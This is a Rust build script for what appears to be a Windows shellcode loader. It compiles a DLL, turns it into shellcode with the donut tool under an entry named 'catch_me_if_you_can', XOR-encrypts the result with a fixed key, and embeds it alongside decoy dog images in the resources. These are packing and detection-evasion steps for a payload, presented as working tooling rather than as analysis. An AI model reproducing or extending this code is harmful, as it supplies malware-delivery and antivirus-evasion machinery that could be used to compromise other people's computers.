use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;

fn main() {
    let target = env::var("TARGET").unwrap();

    if !target.contains("windows-msvc") {
        panic!("Please compile the app using windows msvc")
    };

    println!("cargo:rerun-if-changed=encrypted_app/src/lib.rs");

    let cargo_status = Command::new("cargo")
        .args(&["build", "--release", "--manifest-path", "encrypted_app/Cargo.toml", "--target", &target])
        .status()
        .expect("Failed to build encrypted_app");
    
    assert!(cargo_status.success(), "Library compilation failed");

    let dll_path = format!("encrypted_app/target/{}/release/encrypted_app.dll", target);
    let donut_status = Command::new("./donut")
        .args(&[
            "-i", &dll_path,
            "-m", "catch_me_if_you_can",
            "-o", "shellcode.bin"
        ])
        .status()
        .expect("Failed to run donut");

    assert!(donut_status.success(), "Donut run failed");

    let mut shellcode = Vec::new();
    File::open("shellcode.bin")
        .expect("Failed to open shellcode.bin")
        .read_to_end(&mut shellcode)
        .expect("Failed to read shellcode.bin");

    let key = [0x81, 0xFA, 0x77, 0x20];
    let encrypted_shellcode: Vec<u8> = shellcode
        .iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect();

    let out_dir = std::env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("encrypted_shellcode.bin");
    
    File::create(&dest_path)
        .expect("Failed to create encrypted_shellcode.bin")
        .write_all(&encrypted_shellcode)
        .expect("Failed to write encrypted data");
    
    let out_dir = env::var("OUT_DIR").unwrap();
    let res_file = format!("{}/resources.res", out_dir);

    let status = Command::new("llvm-rc")
        .args(["/fo", &res_file, "resources.rc"])
        .status()
        .expect("Failed to execute llvm-rc. Is llvm installed?");

    if !status.success() {
        panic!("llvm-rc failed to compile resource file");
    }

    println!("cargo:rustc-link-arg={}", res_file);
    println!("cargo:rerun-if-changed=resources.rc");
    println!("cargo:rerun-if-changed=dog.jpg");
    println!("cargo:rerun-if-changed=dog2.jpeg");
}
